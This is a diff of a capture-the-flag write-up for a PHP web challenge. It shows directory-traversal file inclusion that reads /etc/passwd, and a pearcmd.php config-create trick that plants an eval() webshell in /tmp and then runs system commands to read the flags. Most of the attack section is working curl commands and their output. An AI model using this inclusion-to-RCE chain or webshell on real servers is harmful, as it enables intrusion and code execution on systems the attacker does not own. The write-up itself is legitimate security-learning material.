@@ -5,67 +5,13 @@
 
 ## Solution (Baby Flag)
 
-![](Pasted%20image%2020220604105700.png)
+![](Pasted%20image%2020220604215622.png)
 
 Hint is directory traversal, so tried accessing stuff
 
-![](Pasted%20image%2020220604105714.png)
+![](Pasted%20image%2020220604215640.png)
 
-The link redirects to phpinfo
-
-![](Pasted%20image%2020220604110035.png)
-
-
-On Looking at the source code, it shows this. This suggests that this is LFI, and php code is executed,
-
-```html
-<script>
-    let message = `
-        <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "DTD/xhtml1-transitional.dtd">
-<html xmlns="http://www.w3.org/1999/xhtml"><head>
-<style type="text/css">
-body {background-color: #fff; color: #222; font-family: sans-serif;}
-pre {margin: 0; font-family: monospace;}
-a:link {color: #009; text-decoration: none; background-color: #fff;}
-a:hover {text-decoration: underline;}
-table {border-collapse: collapse; border: 0; width: 934px; box-shadow: 1px 2px 3px #ccc;}
-.center {text-align: center;}
-.center table {margin: 1em auto; text-align: left;}
-.center th {text-align: center !important;}
-td, th {border: 1px solid #666; font-size: 75%; vertical-align: baseline; padding: 4px 5px;}
-th {position: sticky; top: 0; background: inherit;}
-h1 {font-size: 150%;}
-h2 {font-size: 125%;}
-.p {text-align: left;}
-.e {background-color: #ccf; width: 300px; font-weight: bold;}
-.h {background-color: #99c; font-weight: bold;}
-.v {background-color: #ddd; max-width: 300px; overflow-x: auto; word-wrap: break-word;}
-.v i {color: #999;}
-img {float: right; border: 0;}
-hr {width: 934px; background-color: #ccc; border: 0; height: 1px;}
-</style>
-<title>PHP 8.1.6 - phpinfo()</title><meta name="ROBOTS" content="NOINDEX,NOFOLLOW,NOARCHIVE" /></head>
-<body><div class="center">
-<table>
-<tr class="h"><td>
-<a href="http://www.php.net/"><img border="0" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAHkAAABACAYAAAA+j9gsAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAD4BJREFUeNrsnXtwXFUdx8/dBGihmE21QCrQDY6oZZykon/gY5qizjgM2KQMfzFAOioOA5KEh+j4R9oZH7zT6MAMKrNphZFSQreKHRgZmspLHSCJ2Co6tBtJk7Zps7tJs5t95F5/33PvWU4293F29ybdlPzaM3df2XPv+Zzf4/zOuWc1tkjl+T0HQ3SQC6SBSlD6WKN4rusGm9F1ps/o5mPriOf8dd0YoNfi0nt4ntB1PT4zYwzQkf3kR9/sW4xtpS0CmE0SyPUFUJXFMIxZcM0jAZ4xrKMudQT7963HBF0n6EaUjkP0vI9K9OEHWqJLkNW1s8mC2WgVTwGAqWTafJzTWTKZmQuZ/k1MpAi2+eys6mpWfVaAPzcILu8EVKoCAaYFtPxrAXo8qyNwzZc7gSgzgN9Hx0Ecn3j8xr4lyHOhNrlpaJIgptM5DjCdzrJ0Jmce6bWFkOpqs0MErA4gXIBuAmY53gFmOPCcdaTXCbq+n16PPLXjewMfGcgEttECeouTpk5MplhyKsPBTiXNYyULtwIW7Cx1vlwuJyDLR9L0mQiVPb27fhA54yBbGttMpc1OWwF1cmKaH2FSF7vAjGezOZZJZ9j0dIZlMhnuRiToMO0c+N4X7oksasgEt9XS2KZCHzoem2Ixq5zpAuDTqTR14FMslZyepeEI4Ogj26n0vLj33uiigExgMWRpt+CGCsEePZqoePM738BPTaJzT7CpU0nu1yXpAXCC3VeRkCW4bfJYFZo6dmJyQTW2tvZc1nb719iyZWc5fmZ6Osu6H3uVzit52oBnMll2YizGxk8muFZLAshb/YKtzQdcaO3Y2CQ7eiy+YNGvLN+4+nJetm3bxhKJxJz316xZw1pbW9kLew+w1944XBEaPj6eYCeOx1gqNe07bK1MwIDbKcOFOR49GuePT5fcfOMX2drPXcQ0zf7y2tvbWVdXF/v1k2+yQ4dPVpQ5P0Um/NjoCX6UBMFZR6k+u7qMYVBYDIEqBW7eXAfPZX19zp2/oaGBHysNMGTFinPZik9fWggbI5Omb13zUDeB3lLsdwaK/YPeyAFU0i8Aw9/2Dwyx4SPjFQEYUlf3MTYw4Jx7CIVCbHR0oqIDNMD+FMG+ZE0dO/tsHlvAWnYS6H4qjfMC+Zld/wg92/tuv2WeeYT87j+H2aFDxysGLuSy+o/z49DQkONnmpqa2MjRyoYsZOXKGnb5Z+vZqlUrxUsAvI9At/oK+elnBpoNw+Dai9TekSMxDrgSh0KrSYshTprc2NhoRf1JtlikqirAVl98AddsSavDBDrsC+QdT7/TSoB344tzOZ39+70RbporVerqasyw1MEnC8iV6I9VTDi0uqbmfPFSq2W+gyUHXuEdb3WR5rab5jnD3i/BNMN8ChNaqsTiKa55KmBWX+Tuj0XQdQVF307nhTH0CPls+O0UPbaT5TQG/8qX68u6LpV67LQ6dNknaYgaYyPDx2TzvYGCsnhRkH8b/rsF2GDj1MCInkvxvRjOuCUlipWD/zrKx7ZOwBF0vfSSM2ShyaqAAOC1Nw+zt9/5YNbrN1zfwIdpfgnqebv/A6pnWAn4qlW1HPgHQ6OeoG3N9RO/+StMdDtmV2LxJPfBpQCGfwTgrVu38jFrKaW2tpZt2LCBdXR0sEgkwhv21u9cxQsyW3ZB1+DgoOM54btU6tu8eTPr6elhy5fr7IZNDey+e76e9/fCLcAllHpdKKinpaUlX8+111xB9VzNrYxqUAY/XVVVJYMOekLu2fFGM8VWYQRYiYkU9bD4vPlHFYnH4/zvkb1CgwACHgMoUpdyw3sFXcXUh4YHaNSHDqaxdL5jwVTXBpeXVY9oF3RcUQ+O09NT7Cayfld+4RJlP42gTIq8w66Qf/X4a6FTSSMMDcaE/NhYecMM+MdyG90OAhodWoAGkTUaSZByO5WdiA4GqwStrrM6k5vFKEXQserr63l7oR5V0NBojKctaSZtbneErOtGmFxwkGewjk0UzpCUlJSIRqMcjN8CkHLDqyRByq0PEGBBhDmdj7rQVujAaLfrrlk7xyW5gUaxpEtOmOQDr0e799NYmDVBi0+OT7FcbsaXxEQk8qprEBQMBm0vVKUBRcNjskFE8W71lSt79uzhda1d6w4ZGTUUp3NWAQ3TvW/fPvbVq+rZH/ceULOcF1/I06CY3QJohCCzNJnYdgEwwvpUKuNbUsLNpO3evZtfSGHp7+/nS2pw3LLFPVWLoA5yHQUtXvXFYjH+vU4F5yOibzsRUL38MTqC3XWh8GCWziMcDjt2BNEZUIfoUOpJkwvziT3S5ua8Jj/4yD5E0yERbPkhKv4RF4mhkN1wCMHN2rWfYZ2dnWz9+vXchNkJzBoaQ8Bxqg91wWo41YdO2dzczD+3bt06Rw0rBG4nOF8oi9M0Jsw9OgLqQ124BifLgeuHyVbN0NXUrODBmDWxgRR0pNrUYqMNgDOZGZbNzvgCuc4j0kX+GPJ2//CcMagQmKkbrm/knwVEp++SIXulM1+nhj9AY207QRDnpsnye24WA59DkuPlV/5j+z5eB2hE0W1tbTyQdNJmDpksRzFp2E9csFJAboRvDvz8gZdJgw2ek55KZphfAv+Inu8UdKnmkEUHQK93EjEZ4Rbkifq8JiactEpYAy9Nli2Gm6CjIZPn1qlKFWizleOG3BIwdKNZ+KRMxr9VHKvr1NKLXo2BhlAVFRPq1qlWW6MBr3NWyY2rTGXO5ySJlN9uDuiGsV7XTVPtl8CHYGizf/9+V5Om0hAwVV4ahuU8qia03HP26kyqFkMOTudDzjs/P/QKBUiBYa5ZNucfZJUkCG/0IhpCxYyqBF3lnLOII8q1GKqdStQ3rTh5MStwXX5O/nE1metGQzPHUH6JatA1OppQ8u1eUbpX44tO4GY5vM5Z9sduFgOfG1GwUOK6VFzaSAmrWCSfzGCuuT/O+bi6QwRdTtqXN2keJ4/ejgkJ5HedRARkbkGe6ARulgMWQ+Wc3cDAWohhoZdcue7ifJ7crfP6Me8dELd0Mv8U2begC2k9SHd3t+NnNm7cqKwRbiYUkykqvlZlmOYVLIq5bHRep46JzotOc9BhuFc0ZHGLph+CJIaXr1FZSIfxsdBiN1+LpALEK2By61Aqs0rwtV7DNBU3BMCYixYTLU6C8bM5hBwum0k1mesBpmPtlj+qXFenFsAgCVLon9DYeIxUnmh05HCdBIkCVRP6ussiepVZJZXIutCHwt2I0YGY2Kiz3AIyeG5aLNooVULQBbHy1/nAK2oEtEanheil+GO3aFg0FnwSilNC4q6OrXzywc0XCy1WMaFu/tgrCBLRuWpHuP+n1zqmRXFN0GAnwKgHeW1E1C/86UDJHFKptATZMPZTafbLXHtN3OPixKRC4ev4GwB2Gy6JxhQNEYul+KoKp79RMaGqKzy9ovzt27c7pidVZtYAGJMYOP7u6bdK1mLI1GQ+/ogSZBahwKuLO2jSZt0odw65xrUhAMNrZskLsGiIXz72F3bTjV+ixvtbWcMQr3NWCbog5VyXAIy63PLrqpJITIqHkcD9P7suSiYbG53wvTLKDbr8WBbjZqIF4F3PD3ItRn1eQd5CBF3lCM5RAIYfVp0/dgZ8SvbJ2/l8MmlvNw+8qJTjm+drWQwaAXO9KMuWncc1GBMXKkGeV/pU5ZxFIsTvzovOCu3HvDnOE7NTu3rLr+PE8fy6+IEX9947YM4n/+LbPT/88R8QqoYAuVSDrZLFKcYso2AcLBIeGDPu6h3M+yqvIE/4Y6w4LdUfi+jcr86L75KvC9+PcbVfd1hCi6U7Innwk1/+Q5rcoetsdyBg3s9aCmivBsNFifGfG9zCJUFiztmpEXAbqhMgr6SLWBPu9R1enRfm1ktrC6cVYWH+/Mqg43x6sYK1edaCex7vkRZHZkF+6P6NkXvvi/TpLNBUaqTtdcsoLtIrVTcem2EHDh7m2uq0ikMINBvafOmazzt+BkGMW9CF70DndPsOaJqb38Y1oXjdCYHOiqwbPofrKid6thMAlnxxPtMy6w4K0ubNhq73U5wd5PtVleCTd+50D2CEafLloqixyv0ufMcOGq64CVaMYN2119gfAdPpuscKOxWgCMDwxfm0pvzBhx9siRLoFt3ca7Ikf+x2yygaYzHdTSi7IT9y8fMJ2Lpdhg+ZCPA2+f05d1A88mBLHzQaoA1dL6ohVLJGi+1uQj8XQMyHIMgaGT6eDxuozMkD294LRaB7CPI27DLHQSskSFRvGa30O/zndF4fF0DMhwa//9//iZ2DcILqN7xBHn1oUweNn7eJ3WO9QHvdMlrMsphKEj8XQPgpuHVVMtGOgF0hC9CGTqbb2kHOzXx73aKiuiymEv2x22ICMYYeWSALBQ7RQ0fkoZIr4DnRtS3ohzf1dNzTG9d0PcwMLahZO8UyKTMm38wteratSVtkplq4oWj0PcfrEinPhYg14H+hvdIwCVs1bvb6O+UBMYFGl90d0LRGLRDgoHEUwYnXDniQStocTVUwfPLaKQGA/RoWOmkvtnsaG8unK+PWMKlH5e+Lznp03N27RdO0TkxmYNZKszYBlyfI3RpjsQkmMOo8ls4Wsx1EKcEVAEvayyNoeRzsO2RI+93PNRLesGYtNpBhL4l/prlgZz5ob0mbtZVFhWC301d0EuQgAHPgS7D9hssTHKyMbRfLptF213NBDRuoaqxNA2yh2VUBDnxJ1M1yRW6gOgt2x64gqXK7ht1yOWyW1+wl7bYXvhUygQXgit4KuVDuBGzSbA2bmmtayNzpRgJOGu7XosHFChZzvrGTiUKt5UMiVsmbmtsCb3+2lZmwm3hFNsA/CiYdKyfhYx3Aws8urp8nsJM72naGCG8zYwZMecjk/WHVVRbsMwU6tBVQsWJS2sNDlrgVTO0RE/vzKQtuN2+/85k5PxlUaL75D3BZwKss+JUqSFRAO/F7Eqlkmj+2gbrgYE8rZFluu+P3pOGsyWCG/Y9/GR8exC+vYfc5flxgzRdDGsDEz/8AJsxwQcBUKPCtmKOMFJO8OKMgF8r3b3sKkAm69TN+2OZCAm5ID/g9XPypwX29ufWgudq0urrKes/8nPkxgy1bdg6z/or/SFc2mzV/xs+6HwySTmdYJp2dpaWKEregYrVfn9/B0xkD2U6+e+sOaHqImTfLrycUOIZM1hJwC3oemPXbi/y5PnsrJ136bUa8pxu69BklmANWwDRkgR1wmwVaglyi3Nz6JLQ+ZG5NxQsgNdAhmIfJN7wxgoWg9fxzPQ+c/g9YAIXgeUKCyipJO4uR/wswAOIwB/5IgxvbAAAAAElFTkSuQmCC" alt="PHP logo" /></a><h1 class="p">PHP Version 8.1.6</h1>
-</td></tr>
-</table>
-<table>
-<tr><td class="e">System </td><td class="v">Linux app-6799f56885-p78l5 5.4.170+ #1 SMP Wed Mar 23 10:13:41 PDT 2022 x86_64 </td></tr>
-<tr><td class="e">Build Date </td><td class="v">May 13 2022 22:25:02 </td></tr>
-<tr><td class="e">Build System </td><td class="v">Linux 919d1ff24703 5.10.0-13-cloud-amd64 #1 SMP Debian 5.10.106-1 (2022-03-17) x86_64 GNU/Linux </td></tr>
-<tr><td class="e">Configure Command </td><td class="v"> &#039;./configure&#039;  &#039;--build=x86_64-linux-gnu&#039; &#039;--with-config-file-path=/usr/local/etc/php&#039; &#039;--with-config-file-scan-dir=/usr/local/etc/php/conf.d&#039; &#039;--enable-option-checking=fatal&#039; &#039;--with-mhash&#039; &#039;--with-pic&#039; &#039;--enable-ftp&#039; &#039;--enable-mbstring&#039; &#039;--enable-mysqlnd&#039; &#039;--with-password-argon2&#039; &#039;--with-sodium=shared&#039; &#039;--with-pdo-sqlite=/usr&#039; &#039;--with-sqlite3=/usr&#039; &#039;--with-curl&#039; &#039;--with-iconv&#039; &#039;--with-openssl&#039; &#039;--with-readline&#039; &#039;--with-zlib&#039; &#039;--disable-phpdbg&#039; &#039;--with-pear&#039; &#039;--with-libdir=lib/x86_64-linux-gnu&#039; &#039;--disable-cgi&#039; &#039;--with-apxs2&#039; &#039;build_alias=x86_64-linux-gnu&#039; </td></tr>
-<tr><td class="e">Server API </td><td class="v">Apache 2.0 Handler </td></tr>
-<tr><td class="e">Virtual Directory Support </td><td class="v">disabled </td></tr>
-<tr><td class="e">Configuration File (php.ini) Path </td><td class="v">/usr/local/etc/php </td></tr>
-<tr><td class="e">Loaded Configuration File </td><td class="v">(none) </td></tr>
-<tr><td class="e">Scan this dir for additional .ini files </td><td class="v">/usr/local/etc/php/conf.d </td></tr>
-<tr><td class="e">Additional .ini files parsed </td><td class="v">/usr/local/etc/php/conf.d/docker-php-ext-sodium.ini
- </td></tr>
-```
-
-Standard hacking protocol calls me to access `/etc/passwd`, and so I did
+Standard hacking protocol calls me to access `/etc/passwd` and read the source code, and so I did
 
 ```
 (base) [hacker@hackerbook ~]$ curl http://sourcelessguessyweb.chall.seetf.sg:1337/?page=../../../etc/passwd
@@ -101,6 +47,324 @@ SEE{2nd_fl4g_n33ds_RCE_g00d_luck_h4x0r}
 
 ## Solution (RCE Flag)
 
+### How I found out in the CTF
+
+I randomly tried accessing `/tmp/hi.php` because I tried creating it via another exploit (phpinfo LFI to RCE). Never expect someone else to do the same. I looked at `pearcmd.php` and realised this could lead to a webshell.
+
+```html
+(base) [hacker@hackerbook tmp]$ curl "http://sourcelessguessyweb.chall.seetf.sg:1337/?page=../../../tmp/hi.php" 
+
+<!--
+\        /|   |\   /   /~~  /~~\    /~~ |~~ |~~\| /~~\ |   |/~~
+ \  /\  / |---| \ /    |__ |    |   |__ |-- |__/||    ||   ||__
+  \/  \/  |   |  |     ___| \__/    ___||__ |  \| \__/  \_/ ___|
+-->
+
+...
+
+whysoserious/pear";s:7:"man_dir";s:79:"/&page=../../../../../usr/local/lib/php/pearcmd.php&/index.php
+main.css
+phpinfo.php
+whysoserious
+whysoserious/pear/man";}    `.replace(/[^A-Za-z0-9!?]/g, ' ').trim();
+
+    if (message) {
+        let currIdx = 0;
+        let messageLength = message.length;
+
+        let parts = document.querySelectorAll('.lazarus-pit > div');
+        for (let i = 0; i < parts.length; i++) {
+            let partLength = parts[i].innerHTML.length;
+
+            parts[i].innerHTML = '';
+
+            for (let j = 0; j < partLength; j++) {
+                parts[i].innerHTML += message[currIdx % messageLength];
+                currIdx++;
+            }
+        }
+    }
+</script>
+</html>(base) [hacker@hackerbook tmp]$ 
+```
+
+### Pearcmd exploit
+
+[https://ctftime.org/writeup/30236](https://ctftime.org/writeup/30236 "https://ctftime.org/writeup/30236") 
+
+[https://chowdera.com/2022/02/202202080401099387.html](https://chowdera.com/2022/02/202202080401099387.html "https://chowdera.com/2022/02/202202080401099387.html")
+
+First I tested that the file I'm creating does not exist yet
+
+```
+(base) [hacker@hackerbook tmp]$ curl "http://sourcelessguessyweb.chall.seetf.sg:1337/?page=../../../tmp/eval.php"  -d "1=system('whoami');"
+
+<!--
+\        /|   |\   /   /~~  /~~\    /~~ |~~ |~~\| /~~\ |   |/~~
+ \  /\  / |---| \ /    |__ |    |   |__ |-- |__/||    ||   ||__
+  \/  \/  |   |  |     ___| \__/    ___||__ |  \| \__/  \_/ ___|
+-->
+
+...
+
+<script>
+    let message = `
+            `.replace(/[^A-Za-z0-9!?]/g, ' ').trim();
+
+    if (message) {
+        let currIdx = 0;
+        let messageLength = message.length;
+
+        let parts = document.querySelectorAll('.lazarus-pit > div');
+        for (let i = 0; i < parts.length; i++) {
+            let partLength = parts[i].innerHTML.length;
+
+            parts[i].innerHTML = '';
+
+            for (let j = 0; j < partLength; j++) {
+                parts[i].innerHTML += message[currIdx % messageLength];
+                currIdx++;
+            }
+        }
+    }
+</script>
+</html>
+```
+
+Creating a webshell file to access via LFI later.
+
+```html
+(base) [hacker@hackerbook tmp]$ curl "http://sourcelessguessyweb.chall.seetf.sg+config-create+/&page=../../../usr/local/lib/php/pearcmd.php&/<?=eval(\$_POST\[1\])?>+/tmp/eval.php"
+
+<!--
+\        /|   |\   /   /~~  /~~\    /~~ |~~ |~~\| /~~\ |   |/~~
+ \  /\  / |---| \ /    |__ |    |   |__ |-- |__/||    ||   ||__
+  \/  \/  |   |  |     ___| \__/    ___||__ |  \| \__/  \_/ ___|
+-->
+...
+
+<script>
+    let message = `
+        CONFIGURATION (CHANNEL PEAR.PHP.NET):
+=====================================
+Auto-discover new Channels     auto_discover    <not set>
+Default Channel                default_channel  pear.php.net
+HTTP Proxy Server Address      http_proxy       <not set>
+PEAR server [DEPRECATED]       master_server    <not set>
+Default Channel Mirror         preferred_mirror <not set>
+Remote Configuration File      remote_config    <not set>
+PEAR executables directory     bin_dir          /&page=../../../usr/local/lib/php/pearcmd.php&/<?=eval($_POST[1])?>/pear
+PEAR documentation directory   doc_dir          /&page=../../../usr/local/lib/php/pearcmd.php&/<?=eval($_POST[1])?>/pear/docs
+PHP extension directory        ext_dir          /&page=../../../usr/local/lib/php/pearcmd.php&/<?=eval($_POST[1])?>/pear/ext
+PEAR directory                 php_dir          /&page=../../../usr/local/lib/php/pearcmd.php&/<?=eval($_POST[1])?>/pear/php
+PEAR Installer cache directory cache_dir        /&page=../../../usr/local/lib/php/pearcmd.php&/<?=eval($_POST[1])?>/pear/cache
+PEAR configuration file        cfg_dir          /&page=../../../usr/local/lib/php/pearcmd.php&/<?=eval($_POST[1])?>/pear/cfg
+directory
+PEAR data directory            data_dir         /&page=../../../usr/local/lib/php/pearcmd.php&/<?=eval($_POST[1])?>/pear/data
+PEAR Installer download        download_dir     /&page=../../../usr/local/lib/php/pearcmd.php&/<?=eval($_POST[1])?>/pear/download
+directory
+Systems manpage files          man_dir          /&page=../../../usr/local/lib/php/pearcmd.php&/<?=eval($_POST[1])?>/pear/man
+directory
+PEAR metadata directory        metadata_dir     <not set>
+PHP CLI/CGI binary             php_bin          <not set>
+php.ini location               php_ini          <not set>
+--program-prefix passed to     php_prefix       <not set>
+PHP's ./configure
+--program-suffix passed to     php_suffix       <not set>
+PHP's ./configure
+PEAR Installer temp directory  temp_dir         /&page=../../../usr/local/lib/php/pearcmd.php&/<?=eval($_POST[1])?>/pear/temp
+PEAR test directory            test_dir         /&page=../../../usr/local/lib/php/pearcmd.php&/<?=eval($_POST[1])?>/pear/tests
+PEAR www files directory       www_dir          /&page=../../../usr/local/lib/php/pearcmd.php&/<?=eval($_POST[1])?>/pear/www
+Cache TimeToLive               cache_ttl        <not set>
+Preferred Package State        preferred_state  <not set>
+Unix file mask                 umask            <not set>
+Debug Log Level                verbose          <not set>
+PEAR password (for             password         <not set>
+maintainers)
+Signature Handling Program     sig_bin          <not set>
+Signature Key Directory        sig_keydir       <not set>
+Signature Key Id               sig_keyid        <not set>
+Package Signature Type         sig_type         <not set>
+PEAR username (for             username         <not set>
+maintainers)
+User Configuration File        Filename         /tmp/eval.php
+System Configuration File      Filename         #no#system#config#
+Successfully created default configuration file "/tmp/eval.php"
+    `.replace(/[^A-Za-z0-9!?]/g, ' ').trim();
+
+    if (message) {
+        let currIdx = 0;
+        let messageLength = message.length;
+
+        let parts = document.querySelectorAll('.lazarus-pit > div');
+        for (let i = 0; i < parts.length; i++) {
+            let partLength = parts[i].innerHTML.length;
+
+            parts[i].innerHTML = '';
+
+            for (let j = 0; j < partLength; j++) {
+                parts[i].innerHTML += message[currIdx % messageLength];
+                currIdx++;
+            }
+        }
+    }
+</script>
+</html>
+(base) [hacker@hackerbook tmp]$
+```
+
+Accessing the file to run custom code.
+
+```
+(base) [hacker@hackerbook tmp]$ curl "http://sourcelessguessyweb.chall.seetf.sg:1337/?page=../../../tmp/eval.php"  -d "1=system('whoami');"
+
+<!--
+\        /|   |\   /   /~~  /~~\    /~~ |~~ |~~\| /~~\ |   |/~~
+ \  /\  / |---| \ /    |__ |    |   |__ |-- |__/||    ||   ||__
+  \/  \/  |   |  |     ___| \__/    ___||__ |  \| \__/  \_/ ___|
+-->
+
+...
+
+<script>
+    let message = `
+        #PEAR_Config 0.9
+a:12:{s:7:"php_dir";s:76:"/&page=../../../usr/local/lib/php/pearcmd.php&/www-data
+/pear/php";s:8:"data_dir";s:77:"/&page=../../../usr/local/lib/php/pearcmd.php&/www-data
+/pear/data";s:7:"www_dir";s:76:"/&page=../../../usr/local/lib/php/pearcmd.php&/www-data
+/pear/www";s:7:"cfg_dir";s:76:"/&page=../../../usr/local/lib/php/pearcmd.php&/www-data
+/pear/cfg";s:7:"ext_dir";s:76:"/&page=../../../usr/local/lib/php/pearcmd.php&/www-data
+/pear/ext";s:7:"doc_dir";s:77:"/&page=../../../usr/local/lib/php/pearcmd.php&/www-data
+/pear/docs";s:8:"test_dir";s:78:"/&page=../../../usr/local/lib/php/pearcmd.php&/www-data
+/pear/tests";s:9:"cache_dir";s:78:"/&page=../../../usr/local/lib/php/pearcmd.php&/www-data
+/pear/cache";s:12:"download_dir";s:81:"/&page=../../../usr/local/lib/php/pearcmd.php&/www-data
+/pear/download";s:8:"temp_dir";s:77:"/&page=../../../usr/local/lib/php/pearcmd.php&/www-data
+/pear/temp";s:7:"bin_dir";s:72:"/&page=../../../usr/local/lib/php/pearcmd.php&/www-data
+/pear";s:7:"man_dir";s:76:"/&page=../../../usr/local/lib/php/pearcmd.php&/www-data
+/pear/man";}    `.replace(/[^A-Za-z0-9!?]/g, ' ').trim();
+
+    if (message) {
+        let currIdx = 0;
+        let messageLength = message.length;
+
+        let parts = document.querySelectorAll('.lazarus-pit > div');
+        for (let i = 0; i < parts.length; i++) {
+            let partLength = parts[i].innerHTML.length;
+
+            parts[i].innerHTML = '';
+
+            for (let j = 0; j < partLength; j++) {
+                parts[i].innerHTML += message[currIdx % messageLength];
+                currIdx++;
+            }
+        }
+    }
+</script>
+```
+
+
+### RCE
+
+I tested listing everything in the root directory
+
+```html
+(base) [hacker@hackerbook tmp]$ curl "http://sourcelessguessyweb.chall.seetf.sg:1337/?page=../../../tmp/eval.php"  -d "1=system('ls /');"
+
+<!--
+\        /|   |\   /   /~~  /~~\    /~~ |~~ |~~\| /~~\ |   |/~~
+ \  /\  / |---| \ /    |__ |    |   |__ |-- |__/||    ||   ||__
+  \/  \/  |   |  |     ___| \__/    ___||__ |  \| \__/  \_/ ___|
+-->
+
+...
+
+/pear";s:7:"man_dir";s:76:"/&page=../../../usr/local/lib/php/pearcmd.php&/bin
+boot
+dev
+etc
+home
+lib
+lib64
+media
+mnt
+opt
+proc
+readflag
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+/pear/man";}    `.replace(/[^A-Za-z0-9!?]/g, ' ').trim();
+
+    if (message) {
+        let currIdx = 0;
+        let messageLength = message.length;
+
+        let parts = document.querySelectorAll('.lazarus-pit > div');
+        for (let i = 0; i < parts.length; i++) {
+            let partLength = parts[i].innerHTML.length;
+
+            parts[i].innerHTML = '';
+
+            for (let j = 0; j < partLength; j++) {
+                parts[i].innerHTML += message[currIdx % messageLength];
+                currIdx++;
+            }
+        }
+    }
+</script>
+```
+
+```html
+</html>(base) [hacker@hackerbook tmp]$ curl "http://sourcelessguessyweb.chall.seetf.sg:1337/?page=../../../tmp/eval.php"  -d "1=system('/readflag');"
+
+<!--
+\        /|   |\   /   /~~  /~~\    /~~ |~~ |~~\| /~~\ |   |/~~
+ \  /\  / |---| \ /    |__ |    |   |__ |-- |__/||    ||   ||__
+  \/  \/  |   |  |     ___| \__/    ___||__ |  \| \__/  \_/ ___|
+-->
+
+...
+
+<script>
+    let message = `
+        #PEAR_Config 0.9
+a:12:{s:7:"php_dir";s:76:"/&page=../../../usr/local/lib/php/pearcmd.php&/SEE{l0l_s0urc3_w0uldn't_h4v3_h3lp3d_th1s_1s_d3fault_PHP_d0cker}/pear/php";s:8:"data_dir";s:77:"/&page=../../../usr/local/lib/php/pearcmd.php&/SEE{l0l_s0urc3_w0uldn't_h4v3_h3lp3d_th1s_1s_d3fault_PHP_d0cker}/pear/data";s:7:"www_dir";s:76:"/&page=../../../usr/local/lib/php/pearcmd.php&/SEE{l0l_s0urc3_w0uldn't_h4v3_h3lp3d_th1s_1s_d3fault_PHP_d0cker}/pear/www";s:7:"cfg_dir";s:76:"/&page=../../../usr/local/lib/php/pearcmd.php&/SEE{l0l_s0urc3_w0uldn't_h4v3_h3lp3d_th1s_1s_d3fault_PHP_d0cker}/pear/cfg";s:7:"ext_dir";s:76:"/&page=../../../usr/local/lib/php/pearcmd.php&/SEE{l0l_s0urc3_w0uldn't_h4v3_h3lp3d_th1s_1s_d3fault_PHP_d0cker}/pear/ext";s:7:"doc_dir";s:77:"/&page=../../../usr/local/lib/php/pearcmd.php&/SEE{l0l_s0urc3_w0uldn't_h4v3_h3lp3d_th1s_1s_d3fault_PHP_d0cker}/pear/docs";s:8:"test_dir";s:78:"/&page=../../../usr/local/lib/php/pearcmd.php&/SEE{l0l_s0urc3_w0uldn't_h4v3_h3lp3d_th1s_1s_d3fault_PHP_d0cker}/pear/tests";s:9:"cache_dir";s:78:"/&page=../../../usr/local/lib/php/pearcmd.php&/SEE{l0l_s0urc3_w0uldn't_h4v3_h3lp3d_th1s_1s_d3fault_PHP_d0cker}/pear/cache";s:12:"download_dir";s:81:"/&page=../../../usr/local/lib/php/pearcmd.php&/SEE{l0l_s0urc3_w0uldn't_h4v3_h3lp3d_th1s_1s_d3fault_PHP_d0cker}/pear/download";s:8:"temp_dir";s:77:"/&page=../../../usr/local/lib/php/pearcmd.php&/SEE{l0l_s0urc3_w0uldn't_h4v3_h3lp3d_th1s_1s_d3fault_PHP_d0cker}/pear/temp";s:7:"bin_dir";s:72:"/&page=../../../usr/local/lib/php/pearcmd.php&/SEE{l0l_s0urc3_w0uldn't_h4v3_h3lp3d_th1s_1s_d3fault_PHP_d0cker}/pear";s:7:"man_dir";s:76:"/&page=../../../usr/local/lib/php/pearcmd.php&/SEE{l0l_s0urc3_w0uldn't_h4v3_h3lp3d_th1s_1s_d3fault_PHP_d0cker}/pear/man";}    `.replace(/[^A-Za-z0-9!?]/g, ' ').trim();
+
+    if (message) {
+        let currIdx = 0;
+        let messageLength = message.length;
+
+        let parts = document.querySelectorAll('.lazarus-pit > div');
+        for (let i = 0; i < parts.length; i++) {
+            let partLength = parts[i].innerHTML.length;
+
+            parts[i].innerHTML = '';
+
+            for (let j = 0; j < partLength; j++) {
+                parts[i].innerHTML += message[currIdx % messageLength];
+                currIdx++;
+            }
+        }
+    }
+</script>
+(base) [hacker@hackerbook tmp]$ 
+```
+
+## Flags
+
+```
+SEE{2nd_fl4g_n33ds_RCE_g00d_luck_h4x0r}
+SEE{l0l_s0urc3_w0uldn't_h4v3_h3lp3d_th1s_1s_d3fault_PHP_d0cker}
+```
+
+# Others
+
+
 ```
 view-source:http://sourcelessguessyweb.chall.seetf.sg:1337/?page=../../../proc/self/environ
 
@@ -119,9 +383,1051 @@ $ curl http://sourcelessguessyweb.chall.seetf.sg:1337/whysoserious
 WHY SO SERIOUS?
 ```
 
-## Flags
+view-source:http://sourcelessguessyweb.chall.seetf.sg:1337/?page=../../../../../usr/local/lib/php/pearcmd.php&c=whoami
 
 ```
-SEE{2nd_fl4g_n33ds_RCE_g00d_luck_h4x0r}
+  
 
+<!--
+
+\ /| |\ / /~~ /~~\ /~~ |~~ |~~\| /~~\ | |/~~
+
+\ /\ / |---| \ / |__ | | |__ |-- |__/|| || ||__
+
+\/ \/ | | | ___| \__/ ___||__ | \| \__/ \_/ ___|
+
+-->
+
+<html lang="en">
+
+<head>
+
+<meta charset="UTF-8">
+
+<title>Why So Serious</title>
+
+<link rel="stylesheet" href="[main.css](http://sourcelessguessyweb.chall.seetf.sg:1337/main.css)">
+
+</head>
+
+<body>
+
+<div class="lazarus-pit">
+
+<h1>WHY SO SERIOUS?</h1>
+
+<a href="[phpinfo.php#:~:text=register_argc_argv](http://sourcelessguessyweb.chall.seetf.sg:1337/phpinfo.php#:~:text=register_argc_argv)" target="_blank">WHY NEED SOURCE?</a>
+
+<p>RIDDLE ME THIS... WHAT'S THE FLAG?</p>
+
+  
+
